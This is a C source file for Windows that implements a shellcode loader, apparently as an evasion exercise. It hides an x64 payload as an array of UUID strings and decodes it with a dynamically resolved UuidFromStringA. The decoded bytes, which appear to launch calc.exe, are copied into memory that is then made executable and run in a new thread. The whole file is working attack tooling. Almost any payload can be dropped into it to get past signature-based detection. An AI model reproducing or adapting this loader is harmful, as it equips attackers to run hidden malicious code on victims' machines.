#include <windows.h>
#include <stdio.h>

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
	);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE          pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T         sBuffSize = 0;

	RPC_STATUS     STATUS = 0;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one UUID string at a time
		// UuidArray[i] is a single UUID string from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if it failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;
}

char* UuidArray[18] = {
        "E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
        "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
        "4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
        "4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
        "8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
        "C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-9090-9090-9090-909090909090"
};

int main() {
    PBYTE       pDeobfuscatedPayload = NULL;
    SIZE_T      sDeobfuscatedSize = 0;

    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());

    printf("[i] Decrypting ...");
    if (!UuidDeobfuscation(UuidArray, sizeof(UuidArray) / sizeof(UuidArray[0]), &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");
    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

	PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
	memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

	DWORD dwOldProtection = 0;

	if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return -1;
	}

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
    

	if (!hThread) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return -1;
	}
    
	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}